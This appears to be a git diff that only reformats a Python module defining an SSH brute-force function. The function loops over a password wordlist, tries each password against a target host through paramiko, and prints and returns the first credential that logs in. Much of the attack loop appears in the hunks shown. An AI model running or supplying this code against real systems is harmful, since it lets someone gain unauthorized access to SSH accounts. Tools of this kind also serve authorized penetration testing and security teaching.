@@ -2,7 +2,10 @@ import paramiko
 from typing import Optional
 from .utils import clear_line
 
-def ssh_bruteforce(host: str, username: str, wordlist_path: str, port: int = 22) -> Optional[str]:
+
+def ssh_bruteforce(
+    host: str, username: str, wordlist_path: str, port: int = 22
+) -> Optional[str]:
     """
     Attempt SSH brute force attack using a password wordlist.
 
@@ -24,7 +27,13 @@ def ssh_bruteforce(host: str, username: str, wordlist_path: str, port: int = 22)
             clear_line()
             print(f"[?] Trying password: {password}", end="\r")
             try:
-                client.connect(hostname=host, port=port, username=username, password=password, timeout=3)
+                client.connect(
+                    hostname=host,
+                    port=port,
+                    username=username,
+                    password=password,
+                    timeout=3,
+                )
                 print(f"[+] SSH login succeeded: {username}:{password}")
                 return password
             except paramiko.AuthenticationException:
@@ -32,8 +41,11 @@ def ssh_bruteforce(host: str, username: str, wordlist_path: str, port: int = 22)
                 print(f"[-] SSH login failed for {username}:{password}", end="\r")
                 pass
             except Exception as e:
-                clear_line()   
-                print(f"Connection error or other SSH issues: {e}. Continuing...", end="\r")
+                clear_line()
+                print(
+                    f"Connection error or other SSH issues: {e}. Continuing...",
+                    end="\r",
+                )
                 pass
             finally:
                 client.close()
